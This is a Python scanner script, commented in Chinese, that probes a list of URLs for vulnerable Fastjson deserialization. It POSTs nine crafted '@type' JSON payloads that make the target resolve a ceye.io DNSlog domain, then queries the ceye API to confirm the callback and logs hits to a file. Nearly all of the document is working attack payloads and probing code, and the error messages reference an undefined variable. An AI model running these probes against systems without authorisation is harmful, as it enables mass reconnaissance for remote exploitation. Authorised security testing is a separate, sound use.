#!/usr/bin/python3
# -*- coding: utf-8 -*-
import string
import time

import requests
import random

proxies = {
    "http":"http://127.0.0.1:8080",
    "https":"http://127.0.0.1:8080"
}

headers = {
    "User-Agent":"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36"
}

# 需要替换成自己的api
api = "XXXXX.ceye.io"

def fastjsonScanner(url_0, keyword):

    dnslog = keyword + '.' + api

    # fastjson 1.2.67 版本之前
    payload_1 = '{"zeo":{"@type":"java.net.Inet4Address","val":"' + dnslog + '"}}'
    # fastjson 1.2.67 版本之后
    payload_2 = '{"@type":"java.net.Inet4Address","val":"' + dnslog + '"}'
    payload_3 = '{"@type":"java.net.Inet6Address","val":"' + dnslog + '"}'
    # 畸形payload
    payload_4 = '{"@type":"java.net.InetSocketAddress"{"address":,"val":"' + dnslog + '"}}'
    payload_5 = '{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"' + dnslog + '"}}""}'
    payload_6 = '{{"@type":"java.net.URL","val":"' + dnslog + '"}:"aaa"}'
    payload_7 = 'Set[{"@type":"java.net.URL","val":"' + dnslog + '"}]'
    payload_8 = 'Set[{"@type":"java.net.URL","val":"' + dnslog + '"}'
    payload_9 = '{{"@type":"java.net.URL","val":"' + dnslog + '"}:0'

    payload_list = [payload_1, payload_2, payload_3, payload_4, payload_5, payload_6, payload_7, payload_8, payload_9]

    for payload in payload_list:
        print(payload)
        try:
            req = requests.post(url=url_0, headers=headers, data=payload, timeout=1)
        except:
            print(url+'访问失败...\n')
            continue

        # dnslog会有延迟，这里稍作停顿
        #time.sleep(3)

        try:                                          # 需要替换自己的token
            check = requests.get(url="http://api.ceye.io/v1/records?token=xxxxxxxxxxx&type=dns&filter=" + keyword, headers=headers)

        except:
            print('dnslog查询失败...\n')

        if check.text.find(keyword) >= 1:
            print('[+]'+url+' 存在 fastjson, payload = ' + payload + '\n')
            with open('result.txt', 'a+') as f:
                f.write(url+' 存在 fastjson, payload = ' + payload + '\n')
            # 只探测一个成功的payload
            break

        
if __name__ == "__main__":
    n = 1
    keys = random.sample(string.ascii_letters, 4)
    key = ''.join(keys)
    for url in open('urls.txt'):
        # 每次运行生成随机key，省去清空dnslog操作

        keyword = str(n) + key
        #print(keyword)
        fastjsonScanner(url.strip(), keyword)
        n += 1
